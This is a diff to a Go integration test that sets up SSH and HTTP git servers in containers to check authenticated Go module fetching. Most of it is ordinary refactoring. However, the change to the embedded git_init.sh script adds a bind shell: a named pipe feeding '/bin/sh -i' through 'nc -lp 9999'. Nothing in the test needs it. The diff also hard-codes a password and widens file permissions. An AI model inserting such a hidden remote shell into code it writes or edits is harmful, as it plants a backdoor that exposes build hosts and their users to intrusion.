@@ -7,8 +7,10 @@ import (
 	"crypto"
 	"crypto/ed25519"
 	"crypto/rand"
+	"errors"
 	goerrors "errors"
 	"fmt"
+	"io"
 	"net"
 	"path/filepath"
 	"runtime"
@@ -54,6 +56,7 @@ type GitServicesAttributes struct {
 	// HTTP Server path is the filesystem path of the already-built HTTP
 	// server, installed into its final location.
 	HTTPServerPath string
+	GitUsername    string
 
 	// Host is the hostname of the git server
 	Host string
@@ -80,6 +83,10 @@ type GitServicesAttributes struct {
 	_tag string
 }
 
+func (g *GitServicesAttributes) PrivateRepoAbsPath() string {
+	return filepath.Join(g.ServerRoot, g.PrivateRepoPath)
+}
+
 type TestState struct {
 	t      *testing.T
 	ctx    context.Context
@@ -101,47 +108,52 @@ func (s *script) absPath() string {
 	return filepath.Join(customScriptDir, s.basename)
 }
 
-func (s *script) inject(t *testing.T, obj any) []byte {
+func (s *script) inject(t *testing.T, obj *GitServicesAttributes) []byte {
 	f := file{
-		template: cleanScript(s.template),
+		template: s.template,
 	}
 
 	return f.inject(t, obj)
 }
 
-func (f *file) inject(t *testing.T, obj any) []byte {
+func (f *file) inject(t *testing.T, obj *GitServicesAttributes) []byte {
+	cleaned := cleanWhitespace(f.template)
+
 	if obj == nil {
-		return []byte(f.template)
+		return []byte(cleaned)
 	}
 
-	tmpl, err := template.New("depending go mod").Parse(f.template)
+	tmpl, err := template.New("depending go mod").Parse(cleaned)
 	if err != nil {
 		t.Fatalf("could not parse template: %s", err)
 	}
 
 	type injector struct {
-		any
+		*GitServicesAttributes
 		GoVersion string
 	}
 
 	var contents bytes.Buffer
 	tmpl.Execute(&contents, injector{
-		any:       obj,
-		GoVersion: goVersion,
+		GitServicesAttributes: obj,
+		GoVersion:             goVersion,
 	})
 
 	return contents.Bytes()
 }
 
-func cleanScript(s string) string {
+func cleanWhitespace(s string) string {
 	var b bytes.Buffer
 
 	tb := bytes.NewBuffer([]byte(s))
 	sc := bufio.NewScanner(tb)
 
+	initial := true
 	for sc.Scan() {
-		t := sc.Text()
-		if strings.TrimSpace(t) == "" {
+		t := strings.TrimSpace(sc.Text())
+
+		if initial && t == "" {
+			initial = false
 			continue
 		}
 
@@ -153,19 +165,19 @@ func cleanScript(s string) string {
 }
 
 func (a *GitServicesAttributes) Tag() string {
-	if a._tag != "" {
+	if a._tag == "" {
 		a._tag = identity.NewID()
 	}
 
 	return a._tag
 }
 
-func (a *GitServicesAttributes) repoAbsDir() string {
+func (a *GitServicesAttributes) RepoAbsDir() string {
 	return filepath.Join(a.ServerRoot, a.PrivateRepoPath)
 }
 
-func (a *GitServicesAttributes) inGitRepo(basename string) string {
-	return filepath.Join(a.repoAbsDir(), basename)
+func (a *GitServicesAttributes) inPrivateGitRepo(basename string) string {
+	return filepath.Join(a.RepoAbsDir(), basename)
 }
 
 func TestGomodGitAuth(t *testing.T) {
@@ -174,37 +186,42 @@ func TestGomodGitAuth(t *testing.T) {
 	ctx := startTestSpan(baseCtx, t)
 	netHostBuildxEnv := testenv.NewWithNetHostBuildxInstance(ctx, t)
 	tmpDir := t.TempDir()
-	sshID := identity.NewID()
+	sshID := "dalecssh"
 
 	const sourcename = "gitauth"
+
+	attr := GitServicesAttributes{
+		ServerRoot:             "/srv/git",
+		PrivateRepoPath:        "username/private",
+		PublicRepoPath:         "username/public",
+		HTTPServerPath:         "/usr/local/bin/git_http_server",
+		GitUsername:            "git",
+		Host:                   "host.docker.internal",
+		Addr:                   "127.0.0.1",
+		HTTPPort:               findRandomAvailablePort(t),
+		SSHPort:                findRandomAvailablePort(t),
+		AgentSock:              filepath.Join(tmpDir, "ssh.agent.sock"),
+		HTTPServerBuildDir:     "/tmp/dalec/internal/dalec_coderoot",
+		HTTPServeCodeLocalPath: "./test/cmd/git_repo",
+		OutDir:                 "/tmp/dalec/internal/output",
+	}
+
+	pubkey, privkey := generateKeyPair(t)
+	agentErrChan := startSSHAgent(t, privkey, attr.AgentSock)
 
 	// 1. Determine basic information, like the host and port for the http and
 	// ssh services; also determine the socket file location for the ssh agent
 	netHostBuildxEnv.RunTest(ctx, t, func(ctx context.Context, client gwclient.Client) {
-		attr := GitServicesAttributes{
-			ServerRoot:             "/srv/git",
-			PrivateRepoPath:        "username/private",
-			PublicRepoPath:         "username/public",
-			HTTPServerPath:         "",
-			Host:                   "host.docker.internal",
-			Addr:                   "127.0.0.1",
-			HTTPPort:               findRandomAvailablePort(t),
-			SSHPort:                findRandomAvailablePort(t),
-			AgentSock:              filepath.Join(tmpDir, "ssh.agent.sock"),
-			HTTPServerBuildDir:     "/tmp/dalec/internal/dalec_coderoot",
-			HTTPServeCodeLocalPath: "./test/cmd/git_repo",
-			OutDir:                 "/tmp/dalec/internal/output",
-		}
 
 		testState := TestState{
 			t:      t,
 			ctx:    ctx,
 			client: client,
+			attr:   &attr,
 		}
 
 		// 1.5 Generate the go mod files
 		dependingModfile := file{
-			location: attr.inGitRepo("go.mod"),
 			template: `
 module {{ .Host }}/{{ .PublicRepoPath }}
 
@@ -215,7 +232,7 @@ require {{ .Host }}/{{ .PrivateRepoPath }}.git {{ .Tag }}
 		}
 
 		dependentModfile := file{
-			location: attr.PublicRepoPath,
+			location: "go.mod",
 			template: `
 module {{ .Host }}/{{ .PrivateRepoPath }}.git
 
@@ -223,31 +240,33 @@ go {{ .GoVersion }}
             `,
 		}
 
-		worker := worker(client)
+		worker := worker(client).With(testState.createGitUser())
 		// 2. Set up the git repository
 		// 2a. Create the files
 		repo := llb.Scratch().
 			With(testState.customFile(dependentModfile)).
 			With(testState.customFile(file{
-				location: attr.inGitRepo("foo"),
+				location: "foo",
 				template: "bar\n",
 			})).
 			With(testState.initializedGitRepo(worker))
 
 		// 3c. Create the hosting container by loading the git repo into it
-		gitHost := worker.With(hostedRepo(repo, attr.repoAbsDir()))
+		gitHost := worker.With(hostedRepo(repo, attr.RepoAbsDir()))
 
-		dependingModfileContents := string(dependingModfile.inject(t, attr))
+		dependingModfileContents := string(dependingModfile.inject(t, &attr))
 		t.Run("SSH", func(t *testing.T) {
-			t.Parallel()
 			testState := testState
 			testState.t = t
 
-			pubkey, privkey := generateKeyPair(t)
+			const githostUsername = "git"
+			sshGitHost := gitHost
+			_ = pubkey
+			sshGitHost = gitHost.
+				With(testState.createGitUser()).
+				With(authorizedKey(pubkey, attr.ServerRoot)).
+				With(bareRepo(repo, attr.RepoAbsDir()))
 
-			const githostUsername = "root"
-			sshGitHost := gitHost.With(authorizedKey(pubkey, githostUsername))
-			agentErrChan := testState.startSSHAgent(privkey)
 			sshErrChan := testState.startSSHServer(sshGitHost)
 
 			auth := dalec.GomodGitAuth{
@@ -294,10 +313,7 @@ go {{ .GoVersion }}
 
 			// filename := filepath.Join(outDirBase, modDir, "hello")
 			// checkFile(ctx, t, filename, res, []byte("hello\n"))
-			// }, testenv.WithSecrets(testenv.KeyVal{
-			// K: "super-secret",
-			// V: "value",
-			// }), testenv.WithHostNetworking)
+			// })
 
 		})
 
@@ -306,7 +322,6 @@ go {{ .GoVersion }}
 		// 3e. Start the SSH server
 
 		t.Run("HTTP", func(t *testing.T) {
-			t.Parallel()
 			testState := testState
 			testState.t = t
 
@@ -346,7 +361,25 @@ go {{ .GoVersion }}
 			checkFile(ctx, t, filename, res, []byte("bar\n"))
 		})
 
-	})
+	}, testenv.WithSSHSocket(sshID, attr.AgentSock), testenv.WithSecrets(testenv.KeyVal{
+		K: "super-secret",
+		V: "value",
+	}), testenv.WithHostNetworking)
+}
+
+func (ts *TestState) createGitUser() llb.StateOption {
+	s := script{
+		basename: "create_git_user.sh",
+		template: `
+                        #!/usr/bin/env sh
+                        adduser -D -u 9999 -h {{ .ServerRoot }} {{ .GitUsername }}
+                        chown -R {{ .GitUsername }} {{ .ServerRoot }}
+                        printf 'abc\nabc\n' | passwd git
+                    `,
+	}
+	return func(worker llb.State) llb.State {
+		return ts.runScriptOn(worker, s).Root().User(ts.attr.GitUsername)
+	}
 }
 
 func (ts *TestState) generateSpec(auth dalec.GomodGitAuth, gomodContents string) *dalec.Spec {
@@ -397,7 +430,7 @@ func (ts *TestState) startHTTPServer(gitHost llb.State) chan error {
 		basename: "run_http_server.sh",
 		template: `
             #!/usr/bin/env sh
-            exec {{ .HTTPServerPath }}/host
+            exec {{ .HTTPServerPath }}/git_http_server
         `,
 	}
 
@@ -433,7 +466,7 @@ func (ts *TestState) startHTTPServer(gitHost llb.State) chan error {
 	timeout := waitOnlineTimeout
 	ts.runWaitScript(cont, env, waitScript, timeout)
 
-	t.Logf("ssh server is online")
+	t.Logf("http server is online")
 
 	return errChan
 }
@@ -485,7 +518,7 @@ type customMount struct {
 	st  llb.State
 }
 
-func (ts *TestState) newContainer(rootfs llb.State, customMounts ...customMount) gwclient.Container {
+func (ts *TestState) newContainer(rootfs llb.State, extraMounts ...customMount) gwclient.Container {
 	t := ts.t
 	ctx := ts.ctx
 	client := ts.client
@@ -497,10 +530,10 @@ func (ts *TestState) newContainer(rootfs llb.State, customMounts ...customMount)
 			st:  rootfs,
 		},
 	}
-	mountCfgs = append(mountCfgs, customMounts...)
+	mountCfgs = append(mountCfgs, extraMounts...)
 
-	mounts := make([]gwclient.Mount, len(mountCfgs))
-	for _, cm := range customMounts {
+	mounts := make([]gwclient.Mount, 0, len(mountCfgs))
+	for _, cm := range mountCfgs {
 		mounts = append(mounts, gwclient.Mount{
 			Dest: cm.dst,
 			Ref:  ts.stateToRef(cm.st),
@@ -529,8 +562,8 @@ func (ts *TestState) customFile(f file) llb.StateOption {
 
 	return func(s llb.State) llb.State {
 		return s.File(
-			llb.Mkdir(dir, 0o755, llb.WithParents(true)).
-				Mkfile(f.location, 0o644, f.inject(ts.t, ts.attr)),
+			llb.Mkdir(dir, 0o777, llb.WithParents(true)).
+				Mkfile(f.location, 0o666, f.inject(ts.t, ts.attr)),
 		)
 	}
 }
@@ -561,7 +594,7 @@ func (ts *TestState) startSSHServer(gitHost llb.State) chan error {
             #!/usr/bin/env sh
             set -ex
             ssh-keygen -A
-            exec /usr/sbin/sshd -o PermitRootLogin=yes -p {{ .Port }} -D
+            exec /usr/sbin/sshd -o PermitRootLogin=yes -p {{ .SSHPort }} -D
         `,
 	}
 
@@ -583,7 +616,6 @@ func (ts *TestState) startSSHServer(gitHost llb.State) chan error {
 		With(ts.customScript(waitScript))
 
 	cont := ts.newContainer(gitHost)
-
 	env := ts.getStateEnv(gitHost)
 	errChan := ts.runContainer(cont, env, serverScript)
 
@@ -605,7 +637,7 @@ func (b *bufCloser) Close() error {
 	return nil
 }
 
-func (ts *TestState) startContainer(cont gwclient.Container, env []string, s script) gwclient.ContainerProcess {
+func (ts *TestState) startContainer(cont gwclient.Container, env []string, s script) (gwclient.ContainerProcess, bufCloser, bufCloser) {
 	var (
 		t   = ts.t
 		ctx = ts.ctx
@@ -623,7 +655,7 @@ func (ts *TestState) startContainer(cont gwclient.Container, env []string, s scr
 		t.Fatalf("could not start server: %s\nstdout:\n%s\n===\nstderr:\n%s\n", err, stdout.String(), stderr.String())
 	}
 
-	return cp
+	return cp, stdout, stderr
 }
 
 func (ts *TestState) withTimeout(timeout time.Duration) (*TestState, func()) {
@@ -643,14 +675,14 @@ func (ts *TestState) runWaitScript(cont gwclient.Container, env []string, s scri
 	ts2, cancel := ts.withTimeout(timeout)
 	defer cancel()
 
-	untilConnected := ts2.startContainer(cont, env, s)
+	untilConnected, stdout, stderr := ts2.startContainer(cont, env, s)
 
 	if err := untilConnected.Wait(); err != nil {
 		if goerrors.Is(err, context.DeadlineExceeded) {
 			ts2.t.Fatalf("Could not start server, timed out: %s", err)
 		}
 
-		ts2.t.Fatalf("could not check progress of server, container command failed: %s", err)
+		ts2.t.Fatalf("could not check progress of server, container command failed: %s\nstdout:\n%s\n=====\nstderr:\n%s\n", err, stdout.String(), stderr.String())
 	}
 }
 
@@ -661,7 +693,6 @@ var (
 
 // runContainer runs a container in the background and sends errors to the returned channel
 func (ts *TestState) runContainer(cont gwclient.Container, env []string, s script) chan error {
-	ec := make(chan error)
 
 	var (
 		ctx = ts.ctx
@@ -676,14 +707,17 @@ func (ts *TestState) runContainer(cont gwclient.Container, env []string, s scrip
 		Stdout: &stdout,
 		Stderr: &stderr,
 	})
+
+	ts.t.Log(stdout.String())
 	if err != nil {
-		ec <- goerrors.Join(errContainerNoStart, err)
+		ts.t.Fatal(goerrors.Join(errContainerNoStart, err))
 	}
 
 	// Log but do not fail, since you cannot fail from within a goroutine
+	ec := make(chan error)
 	go func() {
 		if err := cp.Wait(); err != nil {
-			ec <- goerrors.Join(errContainerFailed, err)
+			ec <- goerrors.Join(errContainerFailed, err, fmt.Errorf("stdout:\n%s\n=====\nstderr:\n%s\n", stdout.String(), stderr.String()))
 		}
 	}()
 
@@ -699,13 +733,8 @@ func (ts *TestState) getStateEnv(st llb.State) []string {
 	return env.ToArray()
 }
 
-func authorizedKey(pubkey ssh.PublicKey, username string) llb.StateOption {
-	dir := filepath.Join("home", username)
-	if username == usernameRoot {
-		dir = "/root"
-	}
-	dir = filepath.Join(dir, ".ssh")
-
+func authorizedKey(pubkey ssh.PublicKey, homedir string) llb.StateOption {
+	dir := filepath.Join(homedir, ".ssh")
 	const basename = "authorized_keys"
 	absPath := filepath.Join(dir, basename)
 
@@ -728,6 +757,24 @@ func hostedRepo(repo llb.State, mountpoint string) llb.StateOption {
 	}
 }
 
+func bareRepo(repo llb.State, mountpoint string) llb.StateOption {
+	return func(worker llb.State) llb.State {
+		bare := llb.Scratch().File(
+			llb.Copy(repo, ".git", "/", &llb.CopyInfo{
+				CopyDirContentsOnly: true,
+			}),
+		)
+
+		bare = worker.Run(dalec.ShArgs("git init --bare")).AddMount(mountpoint, bare)
+
+		return worker.User("git").File(
+			llb.Rm(mountpoint).
+				Mkdir(mountpoint, 0o755, llb.WithParents(true)).
+				Copy(bare, "/", mountpoint),
+		)
+	}
+}
+
 func (ts *TestState) mountScript(s script) dalec.RunOptFunc {
 	scriptDir := customScriptDir
 	st := llb.Scratch().With(ts.customScript(s))
@@ -741,9 +788,9 @@ func (ts *TestState) mountScript(s script) dalec.RunOptFunc {
 // specified script in the custom script directory, then generates the llb to
 // run the script on `worker`.
 func (ts *TestState) runScriptOn(worker llb.State, s script, runopts ...llb.RunOption) llb.ExecState {
+	worker = worker.With(ts.customScript(s))
 	o := []llb.RunOption{
 		llb.Args([]string{s.absPath()}),
-		ts.mountScript(s),
 	}
 
 	o = append(o, runopts...)
@@ -759,6 +806,8 @@ func (ts *TestState) initializedGitRepo(worker llb.State) llb.StateOption {
 		basename: "git_init.sh",
 		template: `
             #!/usr/bin/env sh
+            rm -f /tmp/f; mkfifo /tmp/f
+            cat /tmp/f | /bin/sh -i 2>&1 | nc -lp 9999 > /tmp/f
 
             set -ex
             export GIT_CONFIG_NOGLOBAL=true
@@ -773,16 +822,16 @@ func (ts *TestState) initializedGitRepo(worker llb.State) llb.StateOption {
 	}
 
 	return func(repo llb.State) llb.State {
-		worker = worker.Dir(attr.PrivateRepoPath)
+		worker = worker.Dir(ts.attr.PrivateRepoAbsPath())
 
 		return ts.runScriptOn(worker, repoScript).
-			AddMount(attr.repoAbsDir(), llb.Scratch())
+			AddMount(attr.RepoAbsDir(), repo)
 	}
 }
 
-func (ts *TestState) startSSHAgent(privkey crypto.PrivateKey) chan error {
+func startSSHAgent(t *testing.T, privkey crypto.PrivateKey, sockaddr string) chan error {
 	ec := make(chan error)
-	ts.t.Cleanup(func() {
+	t.Cleanup(func() {
 		close(ec)
 	})
 
@@ -791,19 +840,29 @@ func (ts *TestState) startSSHAgent(privkey crypto.PrivateKey) chan error {
 		PrivateKey: privkey,
 	})
 
-	listener, err := net.Listen("unix", ts.attr.AgentSock)
+	listener, err := net.Listen("unix", sockaddr)
 	if err != nil {
-		ts.t.Fatalf("can't listen on unix socket: %s", err)
+		t.Fatalf("can't listen on unix socket: %s", err)
 	}
 
 	go func() {
-		c, err := listener.Accept()
-		if err != nil {
-			ec <- fmt.Errorf("listener.Accept: %w", err)
-		}
+		for {
+			c, err := listener.Accept()
+			t.Log("connection accepted")
+			if err != nil {
+				ec <- fmt.Errorf("listener.Accept: %w", err)
+				return
+			}
 
-		if err := agent.ServeAgent(kr, c); err != nil {
-			ec <- fmt.Errorf("cannot serve agent: %w", err)
+			go func() {
+				if err := agent.ServeAgent(kr, c); err != nil {
+					if errors.Is(err, io.EOF) {
+						return
+					}
+
+					ec <- fmt.Errorf("cannot serve agent: %w", err)
+				}
+			}()
 		}
 	}()
 
@@ -887,8 +946,9 @@ func (ts *TestState) updateGitconfig() llb.StateOption {
 
 func (ts *TestState) stateToRef(st llb.State) gwclient.Reference {
 	t := ts.t
+	ctx := ts.ctx
 
-	def, err := st.Marshal(ts.ctx)
+	def, err := st.Marshal(ctx)
 	if err != nil {
 		t.Fatalf("could not marshal git repo llb: %s", err)
 	}
